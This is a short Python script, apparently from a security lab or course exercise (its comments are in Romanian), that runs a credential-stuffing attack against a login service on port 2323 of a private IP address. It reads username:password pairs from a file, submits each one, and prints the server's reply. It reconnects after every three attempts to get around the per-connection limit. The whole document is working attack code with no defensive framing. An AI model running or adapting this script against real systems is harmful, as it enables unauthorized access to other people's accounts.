import socket

IP = "172.30.245.124"
FILE = "auth_stuffing.txt"
MAX_TRIES = 3


def read_until(s, text):
    data = b""
    while not data.endswith(text):
        chunk = s.recv(1024)
        if not chunk:  # serverul a inchis conexiunea
            break
        data += chunk
    return data


def new_connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, 2323))
    read_until(s, b"login: ")  # banner + login:
    return s


with open(FILE, "r", encoding="utf-8") as file:
    s = new_connect()
    tries = 0
    for line in file:
        if not line.strip() or ":" not in line:
            continue
        user, password = line.strip().split(":", 1)
        s.send((user + "\n").encode())
        read_until(s, b"password: ")
        s.send((password + "\n").encode())
        msg = read_until(s, b"login: ")
        raspuns = (msg.decode(errors="ignore").splitlines() or ["(nimic)"])[0]
        print(user, password, "->", raspuns)
        tries += 1

        if tries == MAX_TRIES:
            s.close()
            s = new_connect()
            tries = 0
    s.close()
